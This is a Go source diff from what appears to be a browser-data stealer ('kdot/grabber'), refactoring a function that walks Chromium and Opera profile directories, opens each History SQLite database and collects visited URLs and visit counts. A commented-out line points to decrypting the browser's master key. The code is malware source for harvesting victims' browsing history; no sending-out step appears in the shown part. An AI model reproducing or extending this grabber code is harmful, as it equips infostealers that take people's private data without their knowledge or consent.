@@ -3,10 +3,7 @@ package history
 import (
 	"database/sql"
 	"encoding/json"
-	"os"
-	"strings"
-
-	"kdot/grabber/browsers/util"
+	"kdot/grabber/browsers/chromium/structs"
 )
 
 type History struct {
@@ -14,33 +11,12 @@ type History struct {
 	Visit_count string `json:"visit_count"`
 }
 
-func Get() string {
+func Get(browsersList []structs.Browser) string {
 	var history []History
-	dpPaths := util.GetBPth()
-	extraPaths := util.GetProfiles()
-	for _, path := range dpPaths {
-		// check if the path exists
-		if _, err := os.Stat(path); os.IsNotExist(err) {
-			continue
-		}
-		//master_key := decryption.GetMasterKey(path + "\\Local State")
-		ranOpera := false
-		for _, profile := range extraPaths {
-			if ranOpera {
-				break
-			} else if strings.Contains(path, "Opera") {
-				profile = path
-				ranOpera = true
-				if _, err := os.Stat(path); os.IsNotExist(err) {
-					continue
-				}
-			} else {
-				if _, err := os.Stat(path + "\\" + profile); os.IsNotExist(err) {
-					continue
-				}
-				path = path + "\\" + profile
-			}
-			db, err := sql.Open("sqlite3", path+"\\History")
+	for _, browser := range browsersList {
+		for _, profile := range browser.Profiles {
+			path := profile.History
+			db, err := sql.Open("sqlite3", path)
 			if err != nil {
 				continue
 			}
